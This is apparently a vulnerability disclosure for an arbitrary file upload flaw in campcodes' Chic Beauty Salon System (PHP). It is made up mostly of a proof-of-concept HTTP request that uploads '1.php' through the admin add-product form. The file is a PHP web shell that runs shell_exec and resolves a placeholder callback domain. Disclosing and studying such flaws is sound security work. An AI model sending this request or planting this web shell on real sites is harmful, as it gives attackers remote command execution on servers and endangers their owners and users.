 Chic Arbitrary File Upload Vulnerability 
 Affected version: 7/3/2023 
 Manufacturer: www.campcodes.com/ 
 Download Address: 
 https://www.campcodes.com/wp-content/uploads/2023/07/Chic-Beauty-Salon-System.zip 

 Vulnerability Description: 
 The code simply uses the original name of the uploaded file without checking the file type.  This allows an attacker to upload files containing malicious code. 
POC

POST /Chic/admin/add-product.php HTTP/1.1
Host: localhost
Content-Length: 923
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3F5gFDaH9X5FJ7gL
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Chic/admin/add-product.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=j7eak4bjpo3goddnr9s133o6tp
Connection: close

------WebKitFormBoundary3F5gFDaH9X5FJ7gL
Content-Disposition: form-data; name="name"

test
------WebKitFormBoundary3F5gFDaH9X5FJ7gL
Content-Disposition: form-data; name="price"

111
------WebKitFormBoundary3F5gFDaH9X5FJ7gL
Content-Disposition: form-data; name="stock"

212
------WebKitFormBoundary3F5gFDaH9X5FJ7gL
Content-Disposition: form-data; name="image"; filename="1.php"
Content-Type: application/octet-stream

<?php
$domain = "{interact}";
$ip = gethostbyname($domain);
$command = "calc";
$output = shell_exec($command);
echo "<pre>$output</pre>";
?>
------WebKitFormBoundary3F5gFDaH9X5FJ7gL
Content-Disposition: form-data; name="category"

Manicure
------WebKitFormBoundary3F5gFDaH9X5FJ7gL
Content-Disposition: form-data; name="description"

2121
------WebKitFormBoundary3F5gFDaH9X5FJ7gL
Content-Disposition: form-data; name="submit"


------WebKitFormBoundary3F5gFDaH9X5FJ7gL--
